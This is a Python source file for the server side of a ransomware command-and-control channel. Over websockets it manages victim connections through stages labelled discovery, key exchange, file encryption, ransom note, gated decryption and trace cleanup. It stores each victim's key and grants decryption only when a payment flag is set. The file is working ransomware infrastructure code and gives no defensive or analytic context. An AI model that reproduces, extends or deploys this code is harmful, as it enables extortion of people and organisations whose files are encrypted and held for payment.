import websockets
import asyncio 
from enum import Enum
import json

class ConnectionState(Enum):
    CONNECTED = 1 # Connection established with the c2server
    IDENTIFIED = 2 # Envcheck done and username set
    DISCOVERED = 3 # System information found
    CRYPTOGRAPHIC_SETUP = 4 # Cryptographic information prepared and exchanged
    ENCRYPTED = 5 # Files on the system are encrypted
    RANSOMNOTED = 6 # Ransomnote has been dropped on the system
    DECRYPTION_REQUESTED = 7 # Client has requested decryption
    DECRYPTED = 8 # Files have been decrypted
    TRACES_CLEANED = 9 # Any traces of the infection have been removed
    DISCONNECTED = 10 # Connection with the client has been lost.


class Connection:
    def __init__(self, uri, socket: websockets.ServerConnection):
        self.uri = uri
        self.username = None
        self.system_info = None
        self.websocket = socket
        self.state: ConnectionState = ConnectionState.CONNECTED
        self.__key = None
        self.is_paid = False
        self.__selected_client = None


    def set_username(self, username):
        self.username = username

    def set_system_info(self, info):
        self.system_info = info

    def change_state(self, new_state: ConnectionState):
        self.state = new_state

    def set_key(self, key: bytes):
        self.__key = key

    def set_payment_status(self, status: bool):
        self.is_paid = status

    def set_selected_client(self, client:str):
        self.__selected_client = client 

    async def send_message(self, message):
        await self.websocket.send(message)

    async def start(self):
        """Start listening and managing messages from the client."""
        try:
            async for message in self.websocket:
                print(f"[{self.username}] {message}")
                data = json.loads(message)
                match data.get("type"):
                    case "crypto_rep":
                        self.change_state(ConnectionState.CRYPTOGRAPHIC_SETUP)
                        self.set_key(data.get("data", {}).get("key", None))
                    case "decryption_req":
                        self.change_state(ConnectionState.DECRYPTION_REQUESTED)
                        await self.__send_decryption_rep()
                    case "decryption_res":
                        self.change_state(ConnectionState.DECRYPTED)
                    case _:
                        print(f"[{self.username}] Unknown message type: {data.get('type')}")
                print(f"CLI({self.__selected_client})> ", end='', flush=True)

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed by the client.")

    async def __send_decryption_rep(self):
        reply = {
            "type": "decryption_rep",
            "data": {
                "status": "accepted" if self.is_paid else "rejected",
            }
        }
        await self.send_message(json.dumps(reply))

    def show_info(self):
        print(f"Connection info:\n- URI: {self.uri}\n- Username: {self.username}\n- State: {self.state.name}\n- Paid: {self.is_paid}\n- Key: {self.__key}")